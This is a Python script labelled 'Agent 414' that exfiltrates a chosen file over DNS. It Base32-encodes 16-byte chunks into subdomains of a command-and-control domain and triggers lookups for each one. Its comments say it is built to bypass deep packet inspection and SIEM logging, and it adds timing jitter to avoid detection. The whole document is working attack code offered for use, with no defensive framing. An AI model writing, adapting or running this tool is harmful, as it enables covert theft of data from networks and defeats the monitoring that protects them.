#!/home/dan/Chimera_Project/venv/bin/python3
import socket
import base64
import sys
import time

class TrafficShaper:
    """
    Agent 414: Protocol Mimicry & Exfiltration.
    Converts raw data into DNS 'A' record queries to bypass 
    Deep Packet Inspection (DPI) and external SIEM logging.
    """
    def __init__(self, c2_domain):
        self.c2_domain = c2_domain # e.g., "internal-update.com"
        self.dns_server = "8.8.8.8"

    def _encode_data(self, raw_bytes):
        """Encodes bytes into a DNS-safe subdomain string."""
        # Base32 is safer for DNS than Base64 (no special chars)
        import base64
        b32 = base64.b32encode(raw_bytes).decode().replace('=', '').lower()
        return b32

    def transmit(self, data_path):
        """Chunks a file and sends it via DNS queries."""
        print(f"--- [AGENT 414: TRAFFIC SHAPING START] ---")
        if not os.path.exists(data_path):
            print(f"[!] Data source {data_path} not found.")
            return

        with open(data_path, "rb") as f:
            while True:
                chunk = f.read(16) # Small chunks to stay under DNS char limits
                if not chunk:
                    break
                
                encoded_chunk = self._encode_data(chunk)
                # Construct a fake DNS query: [data].[session_id].c2_domain
                query_domain = f"{encoded_chunk}.{self.c2_domain}"
                
                print(f"[*] Mimicking DNS Query: {query_domain}")
                try:
                    # Physically trigger a DNS lookup on the OS
                    socket.gethostbyname(query_domain)
                except socket.gaierror:
                    # This is EXPECTED because the domain doesn't exist; 
                    # the C2 server logs the request anyway.
                    pass
                
                # Jitter: Wait between 1-3 seconds to avoid 'Burst' detection
                time.sleep(1 + (0.1 * (time.time() % 20)))

if __name__ == "__main__":
    import os
    if len(sys.argv) < 2:
        print("Usage: ./main.py <file_to_exfiltrate> <c2_domain>")
        sys.exit(1)
    
    file_path = sys.argv[1]
    domain = sys.argv[2] if len(sys.argv) > 2 else "chimera-update.local"
    TrafficShaper(domain).transmit(file_path)
